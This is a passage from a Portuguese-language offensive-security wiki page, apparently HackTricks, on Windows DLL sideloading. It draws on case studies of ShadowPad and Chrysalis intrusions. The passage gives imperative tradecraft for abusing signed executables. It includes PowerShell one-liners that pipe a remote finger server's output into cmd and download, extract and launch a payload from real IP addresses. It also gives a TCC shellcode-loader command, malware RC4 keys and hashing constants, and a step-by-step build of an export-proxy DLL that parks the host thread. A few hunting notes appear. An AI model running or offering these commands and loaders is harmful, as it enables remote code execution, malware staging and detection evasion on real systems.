- Para requisitos de export, use um proxying framework (e.g., DLLirant/Spartacus) para gerar uma forwarding DLL que também execute seu payload.

- Esta técnica depende da resolução do nome da DLL pelo host binary. Se o host usa absolute paths ou safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack pode falhar.
- KnownDLLs, SxS e forwarded exports podem influenciar a precedence e devem ser considerados ao selecionar o host binary e o export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point descreveu como Ink Dragon implanta ShadowPad usando uma **three-file triad** para se misturar com software legítimo enquanto mantém o core payload encrypted no disco:

1. **Signed host EXE** – vendors como AMD, Realtek ou NVIDIA são abusados (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os attackers renomeiam o executable para parecer um Windows binary (por exemplo `conhost.exe`), mas a Authenticode signature permanece válida.
2. **Malicious loader DLL** – colocado ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL geralmente é um MFC binary ofuscado com o framework ScatterBrain; sua única função é localizar o encrypted blob, decrypt it, e mapear ShadowPad reflective-mente.
3. **Encrypted payload blob** – frequentemente armazenado como `<name>.tmp` no mesmo diretório. Depois de memory-mapping o decrypted payload, o loader deleta o arquivo TMP para destruir forensic evidence.

Notas de tradecraft:

* Renomear o signed EXE (mantendo o `OriginalFileName` original no PE header) permite que ele se passe por um Windows binary e ainda retenha a vendor signature, então replique o hábito de Ink Dragon de dropar binaries com aparência de `conhost.exe` que na verdade são utilities da AMD/NVIDIA.
* Como o executable continua trusted, a maioria dos controles de allowlisting só precisa que sua malicious DLL fique ao lado dele. Foque em customizar a loader DLL; o signed parent normalmente pode rodar sem alterações.
* O decryptor do ShadowPad espera que o TMP blob fique ao lado do loader e seja writable para poder zerar o arquivo após o mapping. Mantenha o diretório writable até o payload carregar; uma vez em memória, o arquivo TMP pode ser apagado com segurança para OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators combinam DLL sideloading com LOLBAS para que o único artifact customizado em disco seja a malicious DLL ao lado do trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell inicia `cmd.exe /c`, obtém comandos de um Finger server e os envia para `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtém texto via TCP/79; `| cmd` executa a resposta do servidor, permitindo que os operators alternem o second stage no lado do servidor.

- **Built-in download/extract:** Baixe um archive com uma extensão benigna, descompacte-o e prepare o sideload target junto com a DLL em uma pasta aleatória `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta o progresso e segue redirects; `tar -xf` usa o tar built-in do Windows.

- **WMI/CIM launch:** Inicie o EXE via WMI para que a telemetria mostre um processo criado via CIM enquanto ele carrega a DLL colocada ao lado:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona com binaries que preferem local DLLs (e.g., `intelbq.exe`, `nearby_share.exe`); o payload (e.g., Remcos) roda sob o trusted name.

- **Hunting:** Alerta para `forfiles` quando `/p`, `/m` e `/c` aparecem juntos; incomum fora de admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uma intrusão recente do Lotus Blossom abusou de uma trusted update chain para entregar um NSIS-packed dropper que preparou um DLL sideload + payloads totalmente em memória.

Tradecraft flow
- `update.exe` (NSIS) cria `%AppData%\Bluetooth`, marca como **HIDDEN**, solta um Bitdefender Submission Wizard renomeado `BluetoothService.exe`, um malicious `log.dll` e um encrypted blob `BluetoothService`, então inicia o EXE.
- O host EXE importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` faz mmap-load do blob; `LogWrite` o decrypta com um stream customizado baseado em LCG (constants **0x19660D** / **0x3C6EF35F**, key material derivado de um hash anterior), sobrescreve o buffer com shellcode plaintext, libera os temporários e salta para ele.
- Para evitar uma IAT, o loader resolve APIs fazendo hash dos export names usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, depois aplica uma Murmur-style avalanche (**0x85EBCA6B**) e compara com salted target hashes.

Main shellcode (Chrysalis)
- Decrypta um main module com aparência de PE repetindo add/XOR/sub com a key `gQ2JR&9;` por cinco passes, depois carrega dinamicamente `Kernel32.dll` → `GetProcAddress` para finalizar a import resolution.
- Reconstrói strings de nomes de DLL em runtime via transforms per-character de bit-rotate/XOR, depois carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa um segundo resolver que percorre a **PEB → InMemoryOrderModuleList**, analisa cada export table em blocos de 4 bytes com Murmur-style mixing, e só recorre a `GetProcAddress` se o hash não for encontrado.

Embedded configuration & C2
- A config fica dentro do arquivo `BluetoothService` solto no disco em **offset 0x30808** (size **0x980**) e é RC4-decrypted com a key `qwhvb^435h&*7`, revelando a C2 URL e o User-Agent.
- Beacons montam um host profile separado por pontos, prefixam a tag `4Q`, depois RC4-encryptam com a key `vAuig34%^325hGV` antes de `HttpSendRequestA` via HTTPS. As responses são RC4-decrypted e despachadas por um tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- O execution mode é controlado por CLI args: sem args = install persistence (service/Run key) apontando para `-i`; `-i` relança a si mesmo com `-k`; `-k` pula a instalação e executa o payload.

Alternate loader observed
- A mesma intrusion soltou Tiny C Compiler e executou `svchost.exe -nostdlib -run conf.c` de `C:\ProgramData\USOShared\`, com `libtcc.dll` ao lado. O C source fornecido pelo attacker embutiu shellcode, compilou e rodou em memory sem tocar o disco com um PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compile-and-run baseada em TCC importou `Wininet.dll` em tempo de execução e carregou um segundo-stage shellcode de uma URL hardcoded, dando um loader flexível que se disfarça como uma execução de compiler.

## Signed-host sideloading com export proxying + host thread parking

Algumas chains de DLL sideloading adicionam **stability engineering** para que o host legítimo permaneça vivo tempo suficiente para carregar stages posteriores de forma limpa, em vez de crashar depois que a DLL maliciosa é carregada.

Padrão observado
- Solte um EXE confiável ao lado de uma DLL maliciosa usando o nome esperado da dependency, como `version.dll`.
- A DLL maliciosa **proxy every expected export** de volta para a DLL real do sistema (por exemplo `%SystemRoot%\\System32\\version.dll`) para que a resolução de imports continue funcionando e o host process siga operando.
- Após o load, a DLL maliciosa **patches o host entry point** para que a main thread caia em um loop infinito de `Sleep` em vez de sair ou executar code paths que encerrariam o process.
- Uma nova thread executa o trabalho malicioso real: decrypting o nome ou path da next-stage DLL (RC4/XOR são comuns) e então lançando-a com `LoadLibrary`.

Por que isso importa
- O DLL proxying normal preserva a compatibilidade da API, mas não garante que o host permaneça vivo tempo suficiente para stages posteriores.
- Colocar a main thread em `Sleep(INFINITE)` é uma forma simples de manter o signed process residente enquanto o loader realiza decrypting, staging ou network bootstrap em uma worker thread.
- Caçar apenas um `DllMain` suspeito pode perder esse padrão se o comportamento interessante acontecer depois que o host entry point é patched e uma secondary thread começa.

Fluxo mínimo
1. Copie o signed host EXE e determine a DLL que ele resolve a partir do diretório local.
2. Construa uma proxy DLL exportando as mesmas funções e encaminhando-as para a DLL legítima.
3. Em `DllMain(DLL_PROCESS_ATTACH)`, crie uma worker thread.
4. A partir dessa thread, patch o host entry point ou a rotina de início da main thread para que ela faça loop em `Sleep`.
5. Decrypt a next-stage DLL name/config e chame `LoadLibrary` ou faça manual-map do payload.

Pontos defensivos
- Signed processes carregando `version.dll` ou bibliotecas comuns semelhantes a partir do próprio diretório da aplicação em vez de `System32`.
- Memory patches no process entry point logo após o image load, especialmente jumps/calls redirecionados para `Sleep`/`SleepEx`.
- Threads criadas por uma proxy DLL que imediatamente chamam `LoadLibrary` em uma segunda DLL com nome decryptado.
- Full-export proxy DLLs colocadas ao lado de executables de vendor dentro de diretórios de staging graváveis como `ProgramData`, `%TEMP%` ou paths de archive descompactados.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
